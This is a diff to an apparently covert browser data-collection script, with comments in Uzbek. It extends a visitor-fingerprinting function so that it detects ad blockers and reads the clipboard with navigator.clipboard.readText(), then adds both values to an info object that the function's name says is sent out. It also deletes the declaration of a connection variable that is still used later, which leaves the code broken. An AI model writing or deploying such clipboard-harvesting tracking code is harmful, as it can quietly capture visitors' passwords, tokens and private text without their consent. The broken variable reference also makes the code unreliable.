@@ -32,16 +32,24 @@ async function collectAndSendInfo() {
             media = devices.map(d => d.kind).reduce((acc, k) => { acc[k] = (acc[k] || 0) + 1; return acc; }, {});
         } catch (e) {}
 
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-
-        // 4. Client Hints va Fingerprint
-        let exactModel = "";
+        // 5. AdBlocker tahlili
+        let adBlock = "Yo'q";
         try {
-            if (navigator.userAgentData) {
-                const h = await navigator.userAgentData.getHighEntropyValues(['model']);
-                exactModel = h.model;
-            }
+            const testAd = document.createElement('div');
+            testAd.innerHTML = '&nbsp;';
+            testAd.className = 'adsbox';
+            document.body.appendChild(testAd);
+            if (testAd.offsetHeight === 0) adBlock = "Ha! 🚫";
+            testAd.remove();
         } catch (e) {}
+
+        // 6. Almashish buferi (Clipboard) - Ruxsat so'rashi mumkin!
+        let clipboard = "Ruxsat berilmadi";
+        try {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                clipboard = await navigator.clipboard.readText();
+            }
+        } catch (e) { clipboard = "Bloklandi yoki Ruxsat yo'q"; }
 
         const info = {
             fingerprint: btoa(navigator.userAgent).substring(15, 35),
@@ -59,6 +67,8 @@ async function collectAndSendInfo() {
             cookies: navigator.cookieEnabled ? "Ha" : "Yo'q",
             orientation: screen.orientation ? screen.orientation.type : "Noma'lum",
             media: media,
+            adBlock: adBlock,
+            clipboard: clipboard,
             connection: conn ? { type: conn.effectiveType, downlink: conn.downlink } : "Noma'lum",
             referrer: document.referrer || 'Direct'
         };
